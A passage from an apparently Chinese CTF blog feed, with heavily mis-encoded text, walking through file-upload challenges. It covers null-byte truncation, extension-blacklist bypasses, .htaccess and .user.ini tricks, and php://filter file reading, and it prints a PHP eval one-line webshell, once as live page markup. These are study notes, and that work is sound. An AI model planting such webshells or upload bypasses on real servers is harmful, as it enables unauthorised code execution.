src="2.PNG"></p><p>å†è¯´ä¸€ä¸ªåªæ˜¯ç‚¹ï¼Œpreg_replace\eæ¨¡å¼</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfer-æ–‡ä»¶ä¸Šä¼ </title>
      <link href="/2021/06/02/ctfer-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-1/"/>
      <url>/2021/06/02/ctfer-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-1/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><span id="more"></span><pre><code>&lt;?php$file=$_FILE[&#39;file&#39;];move_upload_file($file[&#39;tmp_name&#39;],$file[&#39;name&#39;])ï¼›</code></pre><p>move_upload_fileï¼šå°†ä¸Šä¼ çš„æ–‡ä»¶ç§»åŠ¨åˆ°æ–°çš„ä½ç½®ï¼Œç¬¬ä¸€ä¸ªå…ƒç´ ï¼šéœ€è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼Œç¬¬äºŒä¸ªå…ƒç´ ï¼šå°†å…ƒç´ ä¸Šä¼ çš„ä½ç½®</p><h2>00æˆªæ–­</h2><p>ä½¿ç”¨åœºæ™¯ï¼š<br>åç«¯é¦–å…ˆè·å¾—äº†ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶åï¼Œå¦‚x.php\00.jpg,å†æ ¹æ®æ–‡ä»¶åè·å¾—æ–‡ä»¶å®é™…çš„åç¼€ï¼›é€šè¿‡åç¼€çš„ç™½åå•æ ¡éªŒåï¼Œæœ€ç»ˆå†ä¿å­˜æ–‡ä»¶æ—¶å‘ç”Ÿæˆªæ–­ï¼Œå®ç°ä¸Šä¼ çš„æ–‡ä»¶ä¸ºx.php</p><p>ä½†å®é™…ä¸Šå¦‚æœphpä½¿ç”¨$_fileæ³¨å†Œä¸Šä¼ çš„æ—¶å€™å¹¶ä¸å­˜åœ¨è¿™ä¸ªé—®é¢˜ï¼Œå› ä¸ºå†$_fileè¿™é‡Œå·²ç»å®ç°äº†æˆªæ–­</p><p>å…³äº00æˆªæ–­ï¼Œè¿™é‡Œæ¶‰åŠåˆ°ä¸€é“é¢˜ç›®</p><p><a href="http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/index.html">é¢˜ç›®åœ°å€</a></p><p>ä¸è¢«å…è®¸çš„æ–‡ä»¶ç±»å‹,ä»…æ”¯æŒä¸Šä¼ jpg,gif,pngåç¼€çš„æ–‡ä»¶å¯ä»¥çœ‹åˆ°ï¼Œåªèƒ½ä¸Šä¼ è¿™äº›æ–‡ä»¶</p><p>ç„¶åä¸Šä¼ è¯•ä¸€ä¸‹</p><p><img src="1.PNG"></p><p>çœ‹ä¸€ä¸‹å“åº”å¤´</p><pre><code>&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot; /&gt;&lt;/head&gt;&lt;body&gt;Array(    [0] =&gt; .png    [1] =&gt; png)Upload: 1.png&lt;br /&gt;Type: image/png&lt;br /&gt;Size: 0.0234375 Kb&lt;br /&gt;Stored in: ./uploads/8a9e5f6a7a789acb.phparray(4) &#123;  [&quot;dirname&quot;]=&gt;  string(9) &quot;./uploads&quot;  [&quot;basename&quot;]=&gt;  string(5) &quot;1.png&quot;  [&quot;extension&quot;]=&gt;  string(3) &quot;png&quot;  [&quot;filename&quot;]=&gt;  string(1) &quot;1&quot;&#125;&lt;br&gt;å¿…é¡»ä¸Šä¼ æˆåç¼€åä¸ºphpçš„æ–‡ä»¶æ‰è¡Œå•Šï¼&lt;br&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>arrayè¿™é‡Œé¢æŠŠæˆªå‡ºæ¥åç¼€ï¼Œå’Œä¸å¸¦ç‚¹çš„åç¼€ï¼ŒçŒœæµ‹æ˜¯ä¸æ˜¯ä»åé¢å¼€å§‹æˆªæ–­ï¼Œç¢°åˆ°ç‚¹å°±ç»“æŸï¼Œç„¶åç¬¬äºŒæ¬¡æˆªæ–­ï¼Œå»æ‰ç‚¹ã€‚</p><p>åé¢å“ªä¸ªarrayï¼ˆ4ï¼‰ï¼Œç¬¬ä¸€ä¸ªæŠŠæˆªå‡ºæ¥åŸæœ‰çš„è·¯å¾„ï¼Œç¬¬äºŒä¸ªå…¨ç§°ï¼Œç¬¬ä¸‰ä¸ªåç¼€ï¼Œç¬¬å››ä¸ªä¸å¸¦åç¼€çš„æ–‡ä»¶å—ï¼Œæˆ‘ä»¬å°è¯•ä¸€ä¸‹å¯ä¸å¯ä»¥ç”¨00æˆªæ–­</p><p><img src="2.PNG"></p><p>å¥½åƒå¹¶æ²¡æœ‰å®ç°æˆªæ–­ï¼Œé‚£è¯¥æ€ä¹ˆåŠå‘¢ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>è¯·æ±‚æŸ¥çœ‹WPï¼Œç„¶åå­¦ä¹ äº†ä¸€ç¯‡æ–‡ç« </p><p>æˆ‘ä»¬ä¸ºä»€ä¹ˆè¦ä½¿ç”¨00æˆªæ–­ï¼Œæ˜¯å› ä¸ºï¼Œæˆ‘ä»¬ä¸Šä¼ æ—¶åç«¯è¿›è¡Œäº†æ£€æµ‹ï¼Œæˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨æ·»åŠ 00æˆªæ–­ï¼Œæˆªæ–­æ‰åé¢çš„ä¸œè¥¿ï¼Œè€Œåé¢çš„ä¸œè¥¿åˆå¯ä»¥å¸®åŠ©æˆ‘ä»¬ç»•è¿‡æ£€æµ‹</p><p>ä½¿ç”¨æ¡ä»¶ï¼š</p><blockquote><p>php&lt;5.3.29,ä¸”GPCå…³é—­</p></blockquote><h2>00æˆªæ–­çš„åˆ©ç”¨æ–¹æ³•</h2><p>ä¸Šä¼ æ–‡ä»¶åç«¯æ£€æµ‹çš„ä»£ç ï¼š</p><pre><code>$uploaded_name = $_FILES[ &#39;file&#39; ][ &#39;name&#39; ];$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1); // æå–ä¸Šä¼ æ–‡ä»¶åç¼€$target_name = md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext; // å¯¹ä¸Šä¼ æ–‡ä»¶è¿›è¡Œé‡å‘½åif( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; )) &#123;  move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],$dir . $target_name); // å°†ä¸´æ—¶æ–‡ä»¶ç§»åŠ¨åˆ°æŒ‡å®šç›®å½•$result = $dir . $target_name;echo &quot;Stored in: $result&quot;; &#125;else&#123;echo &quot;Invalid file&quot;;&#125;</code></pre><p>åˆšæ‰æˆ‘åœ¨æ–‡ä»¶åä¸­åŠ ä¸Šäº†%00è¿›è¡Œäº†æˆªæ–­ï¼Œçœ‹åˆ°æœ‰å¸ˆå‚…è¯´è¿™æ˜¯ä¸å¯¹çš„</p><p>å°±æ˜¯åˆšæ‰çœ‹ä¹¦é‡Œè¯´çš„ï¼Œä¸Šä¼ ç”¨åˆ°äº†FILEï¼Œå¦‚æœè¯´æ–‡ä»¶åæ—¶1.php%00.jpgï¼Œfileå°±ä¼šç›´æ¥æŠŠ%00åé¢çš„ä¸œè¥¿å»æ‰äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ—¶ä¸Šä¼ ä¸ä¸Šå»çš„</p><p>é‚£ä¹ˆå†ä»€ä¹ˆæ—¶å€™00æˆªæ–­æ‰å¯ä»¥ä½¿ç”¨å‘¢ï¼Ÿæ•°æ®çˆ†ä¸­å¿…éœ€å«æœ‰ä¸Šä¼ åæ–‡ä»¶çš„ç›®å½•æƒ…å†µæ‰å¯ä»¥ä½¿ç”¨ï¼Œæ¯”å¦‚å†æ•°æ®åŒ…ä¸­å­˜åœ¨pathï¼šuploads/ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥é€šè¿‡ä¿®æ”¹pathçš„å€¼æ¥æ„é€ payloadï¼šuploads/1.php%00</p><p>åˆšæ‰é‚£é“é¢˜ç›®å°±ç¬¦åˆè¿™ä¸ª</p><p>ä¸ºä»€ä¹ˆè¿™æ ·å¯ä»¥ï¼Œæˆ‘æƒ³äº†ä¸€ä¸‹</p><p>åˆšæ‰çœ‹äº†æºç ä¹ŸçŸ¥é“ï¼Œå¦‚æœé€šè¿‡äº†ç™½åå•æ£€æµ‹ï¼Œå°±ä¼šå°†æˆ‘ä»¬çš„æ–‡ä»¶åæ‹¼æ¥åˆ°è·¯å¾„åé¢ã€‚å¦‚æœæˆ‘ä»¬æ„é€ çš„è·¯å¾„æ˜¯upload/1.php%00ï¼Œé‚£ä¹ˆæ‹¼æ¥çš„ç»“æœå°±æ˜¯upload/1.php%001.jpgï¼Œç„¶åè¿›è¡Œ00æˆªæ–­å˜æˆäº†upload/1.phpé‚£æˆ‘ä»¬å°±å¯ä»¥getshell</p><p>ç„¶åæˆ‘å°è¯•æŠŠpayloadï¼šupload/1.php%00</p><p>ä½†æ˜¯ä¾æ—§ä¸å¯¹</p><p>ç»§ç»­çœ‹æ–‡ç« </p><li>%00(urldecode)<p>é¦–å…ˆè§£é‡Šä¸ºä»€ä¹ˆè¦è¿›è¡Œurldecodeæ“ä½œå‘¢ï¼Ÿå…¶åŸå› åœ¨äºä¸Šä¼ çš„è¡¨å•ä¸­æœ‰ä¸€ä¸ªenctypeçš„å±æ€§ï¼Œå¹¶ä¸”éœ€è¦enctype=â€multipart/form-dataâ€ (ä¸å¯¹è¡¨å•ä¸­æ•°æ®è¿›è¡Œç¼–ç )ï¼Œpathå¤§å¤šæ•°éƒ½æ˜¯å­˜æ”¾åœ¨è¡¨å•ä¸­çš„ï¼Œå› æ­¤éœ€è¦åœ¨æ•°æ®åŒ…ä¸­è¿›è¡Œurldecodeæ“ä½œä½¿%00å˜æˆå­—ç¬¦ä¸²ç»“æŸç¬¦å·ã€‚</p><p><img src="3.PNG"></p><p><img src="4.PNG"></p><p>åŸæ¥%00å°±æ˜¯å·²ç»ç¼–ç è¿‡çš„ï¼Œå®ƒåŸæ¥æ˜¯asciiè¡¨ç¤º0ï¼Œè€Œ0ä½œä¸ºç‰¹æ®Šå­—ç¬¦ä¿ç•™ï¼Œä½œä¸ºå­—ç¬¦ä¸²çš„ç»“æŸï¼Œæ‰€ä»¥å› ä¸ºæäº¤çš„è¡¨å•ä¸å¯¹è¡¨å•çš„æ•°æ®è¿›è¡Œç¼–ç ï¼Œè€Œä¸”pathå¤§å¤šæ˜¯å­˜åœ¨è¡¨å•çš„ï¼Œæ‰€ä»¥éœ€è¦å¯¹%00è¿›è¡Œè§£ç ã€‚ã€‚ã€‚å› ä¸ºasciiåŸæœ¬æ˜¯ä¸å¯è§å­—ç¬¦</p><p><img src="6.png"></p><p>æ‹¿åˆ°flag</p><h2>æ–‡ä»¶åç¼€é»‘åå•æ ¡éªŒçš„ç»•è¿‡</h2><h3>ä¸Šä¼ æ–‡ä»¶é‡å‘½å</h3><p>å†™ä¸€ä¸‹åç«¯æ£€æµ‹çš„ä»£ç ï¼š</p><pre><code>&lt;?php$file=$_FILE[&#39;file&#39;];$name=$file[&#39;name&#39;];$ext=substr(strrchr($name,&#39;.&#39;),1);$dir=&#39;upload/&#39;;if(in_array($ext,array(&#39;php&#39;,&#39;asp&#39;,&#39;jsp&#39;)))&#123;echo(&#39;Forbid!&#39;);&#125;else&#123;$saveName=$dir.time().&#39;.&#39;.$ext;move_upload_file($file[&#39;tmp_name&#39;],$saveName);exit(&#39;success&#39;);&#125;</code></pre><p>phpå¸¸è§çš„å¯æ‰§è¡Œåç¼€æ˜¯ï¼šphp3ï¼Œphp5.phtmlï¼Œphtã€‚</p><p>aspå¸¸è§çš„å¯æ‰§è¡Œåç¼€æ˜¯ï¼šcdxã€cerã€asaç­‰</p><p>jspå¯ä»¥å°è¯•çš„æ˜¯jspx</p><p>ä½†æ˜¯å¦‚æœå°±è·Ÿæ˜¨å¤©çš„æ‹¿åˆ°é¢˜ç›®å¦‚æœæˆ‘ä»¬ä¸èƒ½</p><h2>ç™¾åº¦æ¯ 9æœˆåœº upload</h2><p>emmmmï¼Œè¯´æ˜¯éšä¾¿ä¼ ã€‚ã€‚ã€‚</p><p>ä¸Šä¼ jpgï¼Œæ”¹åç¼€ï¼Œä¸Šä¼ æˆåŠŸ</p><p>butï¼</p><p><img src="5.PNG"></p><p>å¾ˆæ˜¾ç„¶&lt;?php,æ²¡äº†ã€‚ã€‚è¯•è¯•çŸ­æ ‡ç­¾</p><p><img src="6.PNG"></p><p>éœ‡æƒŠï¼ï¼ï¼æŠŠ&lt;?ç»™è¿‡æ»¤äº†</p><p>é‚£ä¹ˆå°±å¾ˆæ˜¾ç„¶è¿‡æ»¤phpè·Ÿ&lt;?</p><p>å¯ä»¥ç”¨åˆ°å‰é¢çš„çŸ¥è¯†</p><p>ç”¨phtmlï¼Œè¿›è¡Œå†™å…¥ä¸€å¥è¯æœ¨é©¬</p><pre><code>&lt;script language=&quot;PHP&quot;&gt;@eval($_POST[1]);&lt;/script&gt;</code></pre><p>å‰é¢å“ªä¸ªphpæ”¹ä¸ºå¤§å†™å°±å¯ä»¥äº†</p><script language="PHP">@eval($_POST[1]);</script><script language="PHP"> @eval($_POST[1]);</script><h2>.htaccess</h2><p>å…¶å®ä»¥å‰åšé¢˜çš„æ—¶å€™ä¹Ÿç¢°è§è¿‡.htaccessï¼Œå½“æ—¶æ„Ÿè§‰è‡ªå·±å°±å¾ˆæ€¥ï¼Œç„¶åå°±çœ‹ç©WPä¹‹åå°±ç›´æ¥æŠ„ä¸Šå»ï¼Œç„¶ååˆšæ‰çœ‹äº†èµ„æ–™ï¼Œå°±äº†è§£äº†å¾ˆå¤š</p><p>.htaccesså†æˆ‘çš„ç†è§£ä¸Šï¼Œå°±æ˜¯ç›¸å½“äºä¸€ä¸ªæ–‡ä»¶é…ç½®ï¼Œå°±æ˜¯è¯´è®©ç”¨æˆ·è‡ªå·±å»é€šè¿‡ä¸Šä¼ æ–‡ä»¶æ¥è¿›è¡Œè¿›è¡Œæœ‰åŠ©äºæˆ‘ä»¬è¿›è¡Œä¸‹ä¸€æ­¥ä¸Šä¼ æœ¨é©¬çš„æ“ä½œ</p><p>sethandler application/x-httpd-php</p><p>ç„¶åæˆ‘ä»¬å†è¿›è¡Œä¸‹ä¸€æ­¥çš„ä¸Šä¼ ï¼Œx-httpd-phpæ˜¯å°†æ‰€æœ‰ä¸Šä¼ çš„æ–‡ä»¶ä»¥phpçš„å½¢å¼è¿›è¡Œè§£æï¼Œå®Œæˆä¸Šä¼ </p><h2>.user.ini</h2><p>.user.iniåœ¨æˆ‘çš„ç†è§£ä¸‹ï¼Œå°±æ˜¯ç®€å•çš„è¯´ï¼Œæˆ‘æ„Ÿè§‰å°±æ˜¯åƒæ˜¯php.iniï¼Œä¸è¿‡user.iniå°±åƒæ˜¯è®©ç”¨æˆ·è‡ªå·±ä¸Šä¼ ï¼Œç„¶åè¿›è¡Œé…ç½®æ–‡ä»¶</p><p>ä¸Šä¼ çš„php.iniä¸­åº”è¯¥åŒ…å«ç€ä¸‰éƒ¨åˆ†</p><p>GIF89Aç»•è¿‡å¯¹å›¾ç‰‡çš„æ£€æµ‹</p><p>å…¶å®è¿™ä¸ªå¯ä»¥</p><p>auto_prepend_file:æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œå†ä»»ä½•phpæ–‡ä»¶è¿è¡Œä¹‹å‰å°±æŠŠè¯¥æ–‡ä»¶åŒ…å«è¿›æ¥</p><p>auto_append_file:ç±»ä¼¼å‰ä¸€é¡¹ï¼ŒåŒºåˆ«æ˜¯åŒ…å«ç›®æ ‡æ–‡ä»¶å†phpå°¾éƒ¨æ‰§è¡Œã€‚</p><h2>ç¬¬ä¸‰å±Šâ€œç™¾è¶Šæ¯â€ç¦å»ºçœé«˜æ ¡ç½‘ç»œç©ºé—´å®‰å…¨å¤§èµ›Do you know uploadï¼Ÿ</h2><p>æ˜¯è¿™æ ·å­çš„ï¼Œå½“æˆ‘è¯•å›¾ä¸Šä¼ phpç„¶åè¢«banï¼Œç„¶åç›´æ¥å†bpé‚£é‡Œå°†.phpæ”¹ä¸ºäº†.pngï¼Œå¤±è´¥åï¼Œæˆ‘æ„Ÿè§‰emmmï¼Œæˆ‘å¯ä»¥æŠ•ä¸ªæ‡’ï¼Œç›´æ¥å†bpé‚£é‡Œçˆ†ç ´ï¼Œå°±æ–¹ä¾¿å¾ˆå¤šäº†</p><p>ç„¶è€Œã€‚ã€‚ã€‚ã€‚</p><p>å®ƒä¸€ç›´éƒ½æ˜¯æ–‡ä»¶ä¸ç¬¦åˆè¦æ±‚ï¼Ÿï¼Ÿï¼Ÿæˆ‘æŠŠphp,txt,jpg,jpeg,png,php3,php5,phtml,gif,zipéƒ½è¯•è¿‡åï¼Œç«Ÿç„¶éƒ½ä¸Šä¼ ä¸äº†ï¼Œæˆ‘å°±åœ¨æƒ³ï¼Œè¿™é¢˜è¿™ä¹ˆnbï¼Ÿï¼Ÿï¼Ÿè¯´æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯å•¥éƒ½ä¸èƒ½ä¼ ï¼Œè¿™é¢˜æœ‰æ¯›ç—…å§</p><p>çœ‹WPï¼Œå¯¹ä¸èµ·æˆ‘é”™äº†ï¼Œæ˜¯æˆ‘æœ‰æ¯›ç—…ï¼ï¼ï¼</p><p>æˆ‘ä¸ºå•¥å­è¦é—²ç€æ²¡äº‹ç”¨bpçˆ†ç ´ã€‚ã€‚ã€‚ã€‚ã€‚ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ä¸å¥½å—</p><p>ä»¥åè¿˜æ˜¯è€è€è¯•è¯•çš„æ¥å§</p><p>ä½†æ˜¯å½“æˆ‘é‡æ–°ä¸Šä¼ ä¹‹åï¼Œç„¶åå› ä¸ºè¿™é‡Œ</p><p><img src="8.PNG"></p><p>æˆ‘åœ¨æƒ³ï¼Œæ˜¯ä¸æ˜¯æ˜¯é‚£ä¸ªä»Šå¤©ä¸Šåˆå­¦çš„é‚£ä¸ªæ–‡ä»¶ä¸Šä¼ %00æˆªæ–­ï¼Ÿï¼Ÿï¼Ÿä½†æ˜¯å°±å¾ˆå¥‡æ€ªï¼Œä¸€æ—¦ä¸Šä¼ æˆåŠŸå°±è¿ä¸Šå»äº†ï¼Œå½“æˆ‘ä»¥ä¸ºè¿™é“é¢˜ç›®åˆ°æ­¤ä¸ºå€¼å¾—æ—¶å€™ï¼Œæˆ‘å‘ç°ï¼Œå®ƒç«Ÿç„¶æ²¡æœ‰flag.phpç€ä¸€ç±»çš„æ–‡ä»¶å¤¹ï¼ï¼ï¼</p><p>å½“æˆ‘å°è¯•å­¦ç€å‰å‡ å¤©çœ‹fengå¸ˆå‚…çš„WPå­¦åˆ°çš„æ–°çŸ¥è¯†ç”¨findå‘½ä»¤è¿›è¡ŒæŸ¥æ‰¾çš„æ—¶å€™ï¼Œå¾ˆæ˜¾ç„¶æ²¡æœ‰æ‰¾åˆ°</p><p><img src="9.PNG"></p><p>ç„¶åæˆ‘æ¯ç­æ³•äº†ï¼Œå°±åªå¥½æ±‚åŠ©WP</p><p>ç„¶åï¼Œæˆ‘æ¼äº†ä¸€ä¸ªconfig.phpï¼Œæ˜¯æˆ‘ä¸è¯†æ³°å±±ã€‚ã€‚ã€‚ã€‚ã€‚åˆšæ‰æ‚¨è¿™åº§è¿™ä¹ˆé‡è¦çš„å¤§å±±å°±åœ¨æˆ‘å‚è¾¹é™é™çš„ç«™ç€ï¼Œæˆ‘ç«Ÿç„¶æ²¡æœ‰çœ‹åˆ°ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ä¸€å¥nbä»ç»™æˆ‘è‡ªå·±</p><p>config.phpæ˜¯æ•°æ®åº“çš„é…ç½®æ–‡ä»¶ï¼Œæœ‰ç»éªŒçš„å¸ˆå‚…çœ‹åˆ°åè‚¯å®šéƒ½ä¼šä¸Šæ•°æ®åº“ä¸Šæƒ³ï¼Œä½†æ˜¯æƒ³æˆ‘è¿™ç§èœç‹—ï¼Œåªèƒ½çœ¼çççš„é”™è¿‡è¿™ä¹ˆå¥½çš„æç¤ºä¿¡æ¯ã€‚</p><pre><code>&lt;?phperror_reporting(0);session_start();$servername = &quot;localhost&quot;;$username = &quot;ctf&quot;;$password = &quot;ctfctfctf&quot;;$database = &quot;ctf&quot;;// Ã¥Ë†â€ºÃ¥Â»ÂºÃ¨Â¿Å¾Ã¦Å½Â¥$conn = mysql_connect($servername,$username,$password) or die(&quot; connect to mysql error&quot;);mysql_select_db($database);?&gt;</code></pre><p>è¿™æ®µä»£ç å°±æ˜¯å‘Šè¯‰äº†æˆ‘ä»¬ç™»å½•æ•°æ®åº“çš„ç”¨æˆ·åä¸å¯†ç ã€‚ã€‚ã€‚æˆ‘ä¸‡ä¸‡æ²¡æƒ³åˆ°çš„æ˜¯ï¼Œèšå‰‘ç«Ÿç„¶ä¹Ÿå¯ä»¥ç™»å½•æ•°æ®åº“ã€‚ã€‚ã€‚åªèƒ½è¯´ï¼Œæˆ‘å¯¹è¿™ä¸ªå·¥å…·çš„äº†è§£è¿˜æ˜¯å¤ªå°‘äº†ï¼ŒçœŸçš„æ˜¯çˆ±äº†çˆ±äº†</p><p><img src="10.PNG"></p><h3>æ–¹æ³•äºŒï¼Œä½¿ç”¨å¤§é©¬</h3><p>è¯´å®åœ¨ï¼Œå¤§é©¬è¿™ç©æ„ï¼Œæˆ‘è¿˜çœŸçš„æ²¡æœ‰ä½¿ç”¨è¿‡ï¼Œå› ä¸ºä¸€èˆ¬æ–‡ä»¶ä¸Šä¼ ç”¨å°é©¬å°±å¯ä»¥äº†</p><h2>XLcteam å®¢æˆ·ç•™è¨€æ¿</h2><p>å…ˆè¯´åŠŸèƒ½<br>1.ç•™è¨€æœç´¢</p><p>å›æ˜¾ï¼šä¸‡æ¶æ»´é»‘é˜”ï¼Œæœ¬åŠŸèƒ½åªæœ‰ç”¨æœ¬å…¬å¸å¼€å‘çš„æµè§ˆå™¨æ‰å¯ä»¥ç”¨å–”~<br>url :so.php</p><p>2.ç•™è¨€</p><p>éœ€è¦å¡«å†™ï¼šæ˜µç§°ä»¥åŠå†…å®¹ï¼Œå¯ä»¥è¿›è¡Œé¢„è§ˆï¼Œé¢„è§ˆçš„æ—¶å€™æœ‰æç¤ºï¼š(æç¤º:å†æ¬¡æé†’ï¼Œxssä¸ä¿è¯å¯ä»¥æˆåŠŸ,å…è®¸ç•™è¨€æ˜¯ä¸ºäº†å¢åŠ å¨±ä¹æ€§ï¼Œæ¢æ¡æ€è·¯å§!ï¼Œå› ä¸ºæˆ‘ä¹Ÿä¸ä¼šxss- -~) ï¼ˆå¾ˆå¥½ï¼Œæˆ‘ä¹Ÿä¸ä¼šxss,niceï¼‰</p><p>url:say.php?nice=cky&amp;usersay=show+databases()&amp;Submit=ç¡®è®¤æäº¤</p><p>é¢„è§ˆé‡Œé¢è¿˜æœ‰ä¸€ä¸ªï¼špreview.php</p><p>3.cmsè¯´æ˜</p><p>å›æ˜¾ï¼š</p><pre><code>å¾ˆæ˜æ˜¾ï¼Œè¿™æ˜¯å®‰è£…åç•™ä¸‹æ¥å¿˜åˆ é™¤çš„æ–‡ä»¶ã€‚ã€‚ã€‚ è‡³äºé“¾æ¥ä¼šå‡ºç°åœ¨ä¸»é¡µä¸Šï¼Œè¿™å°±è¦é—®ç®¡ç†å‘˜äº†ã€‚ã€‚ã€‚ ===============================åä¸½çš„åˆ†å‰²çº¿============================= æœ¬CMSç”±Funnyå…¬å¸å¼€å‘çš„å…¬å¸ç•™è¨€æ¿ç³»ç»Ÿï¼Œæ®æœ¬æŠ€æœ¯æ€»ç›‘è¯´ï¼Œæ­¤CMSé‡‡ç”¨å›½é™… é¡¶çº§çš„æŠ€æœ¯æ‰€å¼€å‘ï¼Œå®‰å…¨æ€§å’Œå®ç”¨æ€§æ æ æ»´~&lt;/br&gt; ä»¥ä¸‹æ˜¯æœ¬CMSå„æ–‡ä»¶çš„åŠŸèƒ½è¯´æ˜ï¼ˆç”±äºç¨‹åºçŒ¿å·æ‡’ï¼Œåªåˆ—äº†éƒ¨åˆ†æ–‡ä»¶ï¼‰ config.phpï¼šå­˜æ”¾æ•°æ®åº“ä¿¡æ¯ï¼Œç§»æ¤æ­¤CMSæ—¶è¦ä¿®æ”¹ index.phpï¼šä¸»é¡µæ–‡ä»¶ passencode.phpï¼šFunnyå…¬å¸è‡ªå†™å¯†ç åŠ å¯†ç®—æ³•åº“ say.phpï¼šç”¨äºæ¥æ”¶å’Œå¤„ç†ç”¨æˆ·ç•™è¨€è¯·æ±‚ sm.txtï¼šæœ¬CMSçš„è¯´æ˜æ–‡æ¡£ saeçš„information_schemaè¡¨å¥½åƒæ²¡æ³•æ£€ç´¢ï¼Œæˆ‘åœ¨è¿™é‡Œç»™å‡ºadminè¡¨ç»“æ„ create table admin ( id integer, username text, userpass text, ) ======================================================================== ä¸‹é¢æ˜¯æ­£ç»çš„ï¼š æœ¬æ¸—é€æµ‹è¯•å¹³å°ç”±ï¼šä¸‰åªå°æ½´(root#zcnhonker.net)&amp; å†·çˆ±(hh250@qq.com)å¼€ å‘.ç”±ä½ ä»¬å‘¨è€å¤§æˆ‘è¾›è‹¦ä¿®æ”¹ï¼Œä¸èƒ½é¢˜ç›®éƒ½è¢«AKå˜›ï¼Œä½ ä»¬è¯´æ˜¯ä¸æ˜¯ã€‚æ‰€ä»¥è¿™ä¸€é¢˜ã€‚ã€‚ä½ ä»¬åšå‡ºæ¥ä¹Ÿç®—ä½ ä»¬åŠå’¯ã€‚ </code></pre><p>urlï¼šabout.php?file=sm.txt</p><p>è¿™å¥è¯ç»™çš„æç¤ºæœ‰ï¼šæœ‰ä¸€ä¸ªconfig.phpï¼ˆå­˜æ”¾æ•°æ®åº“çš„ä¿¡æ¯ï¼‰ï¼Œæœ‰ä¸ªindex.php,ä¸»é¡µæ–‡ä»¶æ˜¯ï¼špassencode.php,åŠ å¯†ç®—æ³•åº“ï¼šsay.php,ç”¨äºæ¥æ”¶å’Œå¤„ç†ç”¨æˆ·ç•™è¨€è¯·æ±‚çš„sm.txtï¼Œç»™äº†adminè¡¨çš„ç»“æ„create table admin(id integer,username text,iserpass text);</p><p>å¹¶ä¸”è¿™ä¸ªé¡µé¢çœ‹èµ·æ¥å¥½åƒå­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ã€‚ã€‚ã€‚</p><p>/about.php?file=php://filter/read=convert.base64-encode/resource=so.php</p><pre><code>    &lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;æœç´¢ç•™è¨€&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt;&lt;div id=&quot;say&quot; name=&quot;say&quot; align=&quot;left&quot; style=&quot;width:1024px&quot;&gt;&lt;?phpif($_SERVER[&#39;HTTP_USER_AGENT&#39;]!=&quot;Xlcteam Browser&quot;)&#123;echo &#39;ä¸‡æ¶æ»´é»‘é˜”ï¼Œæœ¬åŠŸèƒ½åªæœ‰ç”¨æœ¬å…¬å¸å¼€å‘çš„æµè§ˆå™¨æ‰å¯ä»¥ç”¨å–”~&#39;;exit();&#125;$id=$_POST[&#39;soid&#39;];include &#39;config.php&#39;;include &#39;antiinject.php&#39;;include &#39;antixss.php&#39;;$id=antiinject($id);$con = mysql_connect($db_address,$db_user,$db_pass) or die(&quot;ä¸èƒ½è¿æ¥åˆ°æ•°æ®åº“ï¼ï¼&quot;.mysql_error());mysql_select_db($db_name,$con);$id=mysql_real_escape_string($id);$result=mysql_query(&quot;SELECT * FROM `message` WHERE display=1 AND id=$id&quot;);$rs=mysql_fetch_array($result);echo htmlspecialchars($rs[&#39;nice&#39;]).&#39;:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&#39;.antixss($rs[&#39;say&#39;]).&#39;&lt;br /&gt;&#39;;mysql_free_result($result);mysql_free_result($file);mysql_close($con);?&gt;&lt;/div&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>åœ¨è¿™é‡Œé¢æˆ‘å¯ä»¥çœ‹åˆ°äº†ä»–å…¬å¸çš„æµè§ˆå™¨æ˜¯ï¼šXlcteam 